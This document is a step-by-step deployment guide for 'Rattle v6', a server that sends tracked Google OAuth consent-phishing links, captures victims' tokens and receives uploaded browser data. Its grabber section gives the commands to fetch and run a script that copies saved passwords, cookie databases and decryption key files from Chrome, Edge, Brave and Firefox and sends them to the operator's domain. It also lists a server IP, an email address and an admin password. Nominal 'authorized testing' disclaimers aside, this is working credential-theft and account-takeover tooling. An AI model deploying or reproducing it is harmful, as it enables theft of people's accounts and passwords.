# 🚀 RATTLE — Deployment Guide v6 (A to Z, baby steps, zero errors)

v6 adds the **Browser Grabber** on top of everything in a fully working v4/v5
install. Fresh installs follow the same order. Every step ends with a CHECK —
do not continue until it passes. Values used throughout:

| Thing | Value |
|---|---|
| Domain | officialmonsterz.store |
| VPS IP | 37.10.71.163 |
| VPS OS | Ubuntu 22.04 |
| Email | willsmith32702@gmail.com |
| Repo | https://github.com/officialmonsterz/rattle.git |

Rules: 1) do steps in order 2) pass every CHECK 3) errors → Troubleshooting.

---

# WHAT YOU ARE BUILDING (plain English)

A website (Docker, Nginx, SSL) that:
1. Creates Google OAuth consent links for authorized security testing
2. Gives each target a UNIQUE tracked link and counts clicks
3. Captures the OAuth token on consent + pings your phone via Telegram
4. Re-checks tokens every 30 min (green = valid, red = dead)
5. Password + 6-digit MFA + audit log
6. **NEW (v6)** receives browser-data archives (`/api/grab/upload`) from its
   grabber client (`browser_grab.py`) run on Windows machines you are
   authorized to test — and lists/downloads them on a Grabs page

---

# PART A — FRESH SERVER BUILD (condensed, every command included)

## A0 — You need
- [ ] VPS IP + root password
- [ ] Namecheap login
- [ ] A Gmail you control
- [ ] Telegram on your phone

## A1 — DNS (Namecheap)
Domain List → officialmonsterz.store → Manage → Advanced DNS →
Add: `A Record`, Host `@`, Value `37.10.71.163`, TTL Automatic →
Add: `CNAME`, Host `www`, Value `officialmonsterz.store.`, TTL Automatic →
Delete any A record with the old IP → Save.

CHECK (from your computer): `ping officialmonsterz.store` → must show
`(37.10.71.163)`. If not: wait 10–30 min, retry.

## A2 — VPS prep
    ssh root@37.10.71.163
    apt update && apt upgrade -y
    timedatectl set-timezone UTC
    apt install -y curl git ufw fail2ban wget
    ufw allow OpenSSH && ufw allow 80/tcp && ufw allow 443/tcp && ufw --force enable
    ufw status                                 # CHECK: active, only 22/80/443
    systemctl enable --now fail2ban
    systemctl is-active fail2ban               # CHECK: active
    curl -fsSL https://get.docker.com | sh    # NEVER apt install docker
    docker --version && docker compose version
    # CHECK: both print versions

## A3 — Code + config
    cd /root
    git clone https://github.com/officialmonsterz/rattle.git
    cd /root/rattle

Pre-flight file check (one paste):

    for f in app.py models.py notifier.py liveness.py browser_grab.py \
             config.example.py requirements.txt Dockerfile docker-compose.yml \
             setup_nginx_ssl.sh .gitignore \
             templates/base.html templates/login.html templates/mfa_setup.html \
             templates/dashboard.html templates/campaigns.html \
             templates/campaign_create.html templates/campaign_detail.html \
             templates/tokens.html templates/victims.html templates/settings.html \
             templates/grabs.html templates/grab.html; do
      if [ -f "$f" ]; then echo "OK    $f"; else echo "MISSING  $f  <-- STOP"; fi
    done
    grep -q "Flask-Migrate" requirements.txt && echo "OK    Flask-Migrate" || echo "MISSING Flask-Migrate <-- STOP"
    bash -n setup_nginx_ssl.sh && echo "OK    nginx script" || echo "BROKEN nginx script"
    python3 -c "import ast; ast.parse(open('browser_grab.py').read()); print('OK    browser_grab.py syntax')"

EXPECTED: every line starts with `OK`.

Create config (secret fills itself):

    SECRET=$(python3 -c "import secrets; print(secrets.token_hex(32))")
    GRABKEY=$(python3 -c "import secrets; print(secrets.token_urlsafe(24))")
    cat > config.py << EOF
    """
    Rattle configuration - NEVER commit this file to git.
    """

    class Config:
        RATTLE_SECRET_KEY = "$SECRET"
        DATABASE_URL = "sqlite:///rattle.db"
        RATTLE_INITIAL_PASSWORD = "RattleLab-2026-OfficialMonsterz"
        TELEGRAM_BOT_TOKEN = ""
        TELEGRAM_CHAT_ID = ""
        TOKEN_CHECK_INTERVAL_MINUTES = 30
        GRAB_UPLOAD_KEY = "$GRABKEY"
    EOF

Write down TWO things now: password `RattleLab-2026-OfficialMonsterz` (change it
after first login) and the GRAB key (printed by): `grep GRAB_UPLOAD_KEY config.py`.

CHECK:
    grep -c "PASTE" config.py          # 0
    git check-ignore config.py && echo "PROTECTED - good"

## A4 — Telegram bot
1. @BotFather → /newbot → name `Rattle Alerts` → pick unique username → copy token
2. Open YOUR new bot's chat → send it `hello` (mandatory)
3. Browser: https://api.telegram.org/bot<TOKEN>/getUpdates → copy `"chat":{"id": N`
4. `nano config.py` → fill TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID → Ctrl+O, Enter, Ctrl+X

CHECK: `curl -s "https://api.telegram.org/bot<TOKEN>/sendMessage" -d chat_id=<ID> -d text="Rattle test"`
→ message arrives AND output contains `"ok":true`.

## A5 — Build + start
    docker compose up -d --build          # CHECK: pip step RUNS, not CACHED
    sleep 5
    docker compose ps                     # CHECK: Up (not Exited/Restarting)
    curl -s http://127.0.0.1:8000/health
    # CHECK: {"database":true,"status":"ok"}
    docker compose logs rattle | grep -E "FIRST RUN|Initial"
    # CHECK: First-run admin created using RATTLE_INITIAL_PASSWORD

## A6 — Nginx + SSL
    dig +short officialmonsterz.store     # CHECK: 37.10.71.163
    chmod +x setup_nginx_ssl.sh
    ./setup_nginx_ssl.sh
    # answer: officialmonsterz.store / willsmith32702@gmail.com / /root/rattle / 8000
    chmod 755 /root && chmod -R 755 /root/rattle/static

CHECK (your browser): https://officialmonsterz.store/health → ok + padlock 🔒

## A7 — Login, password, MFA
1. https://officialmonsterz.store → user `rattle`, password from A3
2. Settings → change password (12+ chars)
3. MFA → scan QR with Google Authenticator → enter code → Enable
4. Logout → login → enter 6-digit code → CHECK: you get in
5. Dashboard → Audit Log shows login_success / mfa_enabled / password_changed

## A8 — Google Cloud OAuth (summary)
console.cloud.google.com → NEW PROJECT `rattle-lab` → enable Gmail API +
Google Drive API → Google Auth Platform (or OAuth consent screen):
app `Rattle Lab`, user support email → Audience → Testing → add
willsmith32702@gmail.com as Test User → Clients → CREATE OAUTH CLIENT (Web app):
  - JS origin:  https://officialmonsterz.store
  - Redirect:   https://officialmonsterz.store/callback
Copy Client ID (ends `.apps.googleusercontent.com`) + secret (starts `GOCSPX-`).

## A9 — Campaign + end-to-end test
Campaigns → New Campaign → paste ID/secret → Redirect URI
`https://officialmonsterz.store/callback` → Create. On the campaign page:
Per-Target Tracked Links → label `self-test` → Generate → open link → sign in →
Allow → CHECK: Telegram ping, Tokens row `valid`, Dashboard +1, victim Authorized.

For every Gmail/Drive command (read mail, search, Drive, refresh, decode)
see the **Token Playbook** in the README and your v4 guide — unchanged in v6.

---

# PART B — THE BROWSER GRABBER (new in v6)

## B0 — What it is, in one paragraph
`browser_grab.py` is a small Python script you run on a **Windows machine you
own or are authorized to test**. It finds every Chrome/Edge/Brave profile and
copies `Local State`, the `Cookies` database and `Login Data`; it finds every
Firefox profile and copies `cookies.sqlite`, `logins.json`, `key4.db`; it
counts the cookies, zips everything with a `manifest.json`, and (optionally)
uploads the zip to your server. It needs ONLY Python 3 on that machine — no
pip installs, nothing else.

## B1 — Prepare the server (already done above)
- Endpoints live in app.py (v6 code). No extra install, no migration step:
  the `grab` table is created automatically on first start.
- Your upload URL: `https://officialmonsterz.store/api/grab/upload`
- Your key: the `GRAB_UPLOAD_KEY` value from Step A3 (`grep GRAB_UPLOAD_KEY config.py`)

CHECK on your computer:

    curl -s -X POST https://officialmonsterz.store/api/grab/upload -H "X-Grab-Key: WRONG" -F "file=@/dev/null"
    # or on Windows: curl -s -X POST ... must return {"error":"bad or missing X-Grab-Key header",...}

EXPECTED: `{"error":"bad or missing X-Grab-Key header"}` with HTTP 401.
If you get that WITH a wrong key, the endpoint is alive and protected. ✓

## B2 — Prepare the目标 Windows machine
1. Log in as the user whose browser data you want.
2. Install Python 3 (python.org → "Add python.exe to PATH" ✔) — check:

       python --version

   EXPECTED: `Python 3.12.x` (any 3.8+ works).

3. Get the script (the server hands it out):

       curl -o rattle_grab.py https://officialmonsterz.store/grab/download

   EXPECTED: a file named `rattle_grab.py` appears in the folder.
   (curl ships with Windows 10/11. If missing: download it from the
   dashboard → Grabs → "How to collect" page manually.)

## B3 — Dry run first (no upload — see exactly what it finds)

    python rattle_grab.py

EXPECTED (example, colors on a real console):

    ============================================================
      RATTLE Browser Data Grabber
      authorized use only - coded by t.me/officialmonsterz
    ============================================================
    [*] device label : DESKTOP-ABC123-will
    [*] browsers     : chrome, edge, brave, firefox
    [*] scanning chrome profiles ...
    [+] [chrome] Local State copied (copy)
    [+] [chrome/Default] Cookies copied (sqlite-backup, 512 cookies)
    [+] [chrome/Default] Login Data copied (copy)
    [!] [chrome/Profile_1] no Login Data
    [*] scanning edge profiles ...
    [!] edge: not installed on this machine
    [*] scanning brave profiles ...
    [+] [brave/Default] Cookies copied (copy, 43 cookies)
    [*] scanning firefox profiles ...
    [+] [firefox/xxxxxxxx.default-release] cookies.sqlite copied (copy)
    [+] [firefox/xxxxxxxx.default-release] key4.db copied (copy)
    [+] [firefox/xxxxxxxx.default-release] logins.json copied (copy)

    [+] archive saved : rattle_grab_20260101_120000.zip
    [+] files copied  : 8
    [+] cookies found : 555
    [+] archive size  : 2.41 MB
    DONE.

The `(sqlite-backup)` note means Chrome was running and had the Cookies file
locked — the script read it with the SQLite immutable trick instead. That is a
GOOD line, not an error.

## B4 — Real run with upload

    python rattle_grab.py --upload https://officialmonsterz.store/api/grab/upload --key PASTE-YOUR-GRABKEY --device test-laptop

Two extra lines at the end:

    [*] uploading to https://officialmonsterz.store/api/grab/upload ...
    [+] upload OK - server said: {"id": 1, "size": 2531008, "success": true}

## B5 — Verify on the server (three checks)
1. Dashboard → **Grabs** → a row: `test-laptop`, badges `chrome` `firefox`,
   cookies 555, ~2 MB, your IP, timestamp → **Download** saves the zip locally.
2. 📱 Telegram: `📦 Rattle grab received / Device: test-laptop / Browsers:
   chrome,firefox / Cookies: 555 / Size: 2.41`
3. Dashboard → Audit Log → row `grab_received`.

## B6 — What's inside the zip (and what each file is)

    rattle_grab_YYYYMMDD_HHMMSS.zip
    ├── manifest.json                      <- device, user, hostname, counts
    ├── chrome/
    │   ├── Local State                   <- holds the encryption key reference
    │   ├── Default/
    │   │   ├── Cookies.sqlite            <- the cookie database for that profile
    │   │   └── Login Data.sqlite         <- saved passwords (encrypted)
    │   └── Profile_1/Cookies.sqlite
    ├── brave/Default/Cookies.sqlite
    └── firefox/xxxx.default-release/
        ├── cookies.sqlite
        ├── key4.db                       <- Firefox password key material
        └── logins.json

Plain English about decryption: these files were encrypted **by that Windows
user, on that machine**. They decrypt properly when processed in that same user
context (the standard DPAPI approach) or when extracted on the machine that
owns them. That is why the grabber also saves `Local State` and `key4.db` —
they are the pieces the decryption needs. To inspect quickly:

    sqlite3 Cookies.sqlite "SELECT host_key, name FROM cookies LIMIT 20;"      # Chromium
    sqlite3 cookies.sqlite "SELECT host, name FROM moz_cookies LIMIT 20;"      # Firefox

EXPECT: a list of site domains and cookie names (values stay encrypted — that
is by design; the decryption key file is right next to them in the zip).

## B7 — Useful options
    --browsers chrome,firefox          # only some browsers
    --out C:\Temp                      # where the zip is written
    --device office-pc-2               # label shown on the Grabs page
    --key ... --upload ...             # direct upload

---

# PART C — TROUBLESHOOTING (everything from v4 still applies, plus)

**T20 — `MISSING browser_grab.py` in the A3 check**
The client script was never committed to GitHub. On GitHub: Add file → Create
new file → `browser_grab.py` → paste the full script → Commit. On the VPS:
`cd /root/rattle && git pull` → re-run the A3 check.

**T21 — Client prints `[x] no browser data collected`**
No browser profiles with cookies exist on that machine (fresh Windows, brand
new browser, or Private-Mode-only usage). Open the browser, visit any site,
retry. Not a code error.

**T22 — `upload failed (HTTP 401)`**
Wrong `--key`. Get the real one on the VPS: `grep GRAB_UPLOAD_KEY /root/rattle/config.py`.
Also possible: you added/changed the key after the last `docker compose up -d` —
config.py is bind-mounted read-only, changes apply on container restart:
`docker compose restart rattle`.

**T23 — `upload failed (HTTP 413)`**
The zip is over 256 MB (huge profiles). Raise the limit in app.py
(`MAX_CONTENT_LENGTH`) or use `--browsers firefox` / fewer browsers to split it.

**T24 — Grabs page empty though the client said `upload OK`**
Wrong server? Check you uploaded to YOUR domain. Also confirm:
`docker compose logs rattle | grep "GRAB RECEIVED"` → the line must exist
with the same timestamp.

**T25 — Telegram grab alert missing but row exists**
Same fixes as T4 in v4: token/chat id, `docker compose exec rattle cat /app/config.py | grep TELEGRAM`.

**T26 — `[!] Permissions denied`-style warnings on `Login Data` for a profile**
That profile has no saved passwords (`no Login Data`). Expected, safe to ignore.

---

# ✅ FINAL HARDENING CHECKLIST

- [ ] DNS → 37.10.71.163, UFW only 22/80/443, fail2ban active
- [ ] Docker via get.docker.com; pre-flight file check all OK (incl. browser_grab.py)
- [ ] config.py via heredoc, git-ignored, fixed admin password, GRAB_UPLOAD_KEY set
- [ ] Telegram `"ok":true` test passed
- [ ] Container Up, /health ok over https with padlock
- [ ] Admin password changed + MFA enabled + tested
- [ ] Google app in Testing, test user added, redirect URIs exact
- [ ] Tracked-link end-to-end test → token captured → Telegram pinged
- [ ] Wrong-key upload returns 401 (step B1)
- [ ] Grab dry-run ran and listed profiles (step B3)
- [ ] Real grab uploaded → Grabs page row + Telegram + audit row (B5)

Done. Rattle v6 is live, hardened, and fully operational — for authorized
security research in your own lab, on infrastructure and machines you own or
are explicitly permitted to test.
